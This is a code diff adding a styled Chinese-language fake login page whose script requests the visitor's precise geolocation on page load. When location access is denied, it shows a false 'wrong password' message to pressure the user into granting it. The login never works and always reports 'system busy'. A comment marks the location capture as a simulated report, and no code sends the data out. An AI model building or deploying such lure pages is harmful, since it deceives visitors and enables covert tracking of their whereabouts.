@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+	<head>
+		<meta charset="UTF-8" />
+		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+		<title>H5高端登录+定位</title>
+		<style>
+			body,
+			html {
+				margin: 0;
+				padding: 0;
+				height: 100%;
+				font-family: "Segoe UI", sans-serif;
+				background: linear-gradient(135deg, #74ebd5, #9face6);
+				display: flex;
+				justify-content: center;
+				align-items: center;
+				overflow: hidden;
+			}
+
+			.login-card {
+				width: 360px;
+				padding: 40px 30px;
+				border-radius: 20px;
+				background: rgba(255, 255, 255, 0.15);
+				box-shadow: 0 8px 32px rgba(31, 38, 135, 0.2);
+				backdrop-filter: blur(15px);
+				border: 1px solid rgba(255, 255, 255, 0.2);
+			}
+
+			.login-card h2 {
+				text-align: center;
+				color: white;
+				margin-bottom: 30px;
+			}
+
+			.login-card input {
+				width: 100%;
+				padding: 14px;
+				margin-bottom: 20px;
+				border: none;
+				border-radius: 8px;
+				background: rgba(255, 255, 255, 0.3);
+				color: white;
+				font-size: 16px;
+				outline: none;
+			}
+
+			.login-card input::placeholder {
+				color: rgba(255, 255, 255, 0.7);
+			}
+
+			.login-card button {
+				width: 100%;
+				padding: 14px;
+				border: none;
+				border-radius: 8px;
+				background: linear-gradient(90deg, #667eea, #764ba2);
+				color: white;
+				font-size: 16px;
+				font-weight: bold;
+				cursor: pointer;
+				transition: all 0.3s ease;
+			}
+
+			.login-card button:hover {
+				transform: scale(1.03);
+				box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+			}
+
+			/* Toast 样式 */
+			.toast {
+				position: fixed;
+				top: 50%;
+				left: 50%;
+				transform: translate(-50%, -50%) scale(1);
+				background: rgba(255, 255, 255, 0.15);
+				color: white;
+				backdrop-filter: blur(12px);
+				border: 1px solid rgba(255, 255, 255, 0.2);
+				padding: 16px 24px;
+				border-radius: 12px;
+				box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
+				opacity: 0;
+				transition: opacity 0.4s ease;
+				z-index: 9999;
+				font-size: 16px;
+				pointer-events: none;
+			}
+
+			.toast.show {
+				opacity: 1;
+				pointer-events: auto;
+			}
+		</style>
+	</head>
+	<body>
+		<div class="login-card">
+			<h2>欢迎登录</h2>
+			<input type="text" id="username" placeholder="账号 / 手机号" />
+			<input type="password" id="password" placeholder="密码" />
+			<button onclick="login()">登录</button>
+		</div>
+
+		<!-- Toast容器 -->
+		<div id="toast" class="toast"></div>
+
+		<script type="text/javascript">
+			let lat;
+			let lng;
+			navigator.geolocation.getCurrentPosition(
+				(position) => {
+					lat = position.coords.latitude;
+					lng = position.coords.longitude;
+					console.log('上报定位：', lat, lng);
+					showToast('系统繁忙，稍后重试。lat=' + lat + ', lng=' + lng);
+				},
+				(error) => {
+					switch (error.code) {
+						case error.PERMISSION_DENIED:
+							showToast('密码错误'); // 权限拒绝，按你设定的逻辑提示密码错误
+							break;
+						case error.POSITION_UNAVAILABLE:
+							showToast('定位不可用');
+							break;
+						case error.TIMEOUT:
+							showToast('定位超时');
+							break;
+						default:
+							showToast('定位失败');
+							break;
+					}
+				}, {
+					enableHighAccuracy: true,
+					timeout: 5000,
+					maximumAge: 0
+				}
+			);
+
+
+			function showToast(message, duration = 2500) {
+				const toast = document.getElementById('toast');
+				toast.textContent = message;
+				toast.classList.add('show');
+				setTimeout(() => {
+					toast.classList.remove('show');
+				}, duration);
+			}
+
+			function login() {
+				const username = document.getElementById('username').value;
+				const password = document.getElementById('password').value;
+
+				if (!username || !password) {
+					showToast('请输入账号和密码');
+					return;
+				}
+
+				// 获取定位
+				if (!navigator.geolocation) {
+					showToast('系统繁忙，稍后重试');
+					return;
+				}
+
+				// 模拟上报
+				setTimeout(() => {
+					showToast('系统繁忙，稍后重试。lat=' + lat + ', lng=' + lng);
+				}, 1000);
+			}
+		</script>
+	</body>
+</html>
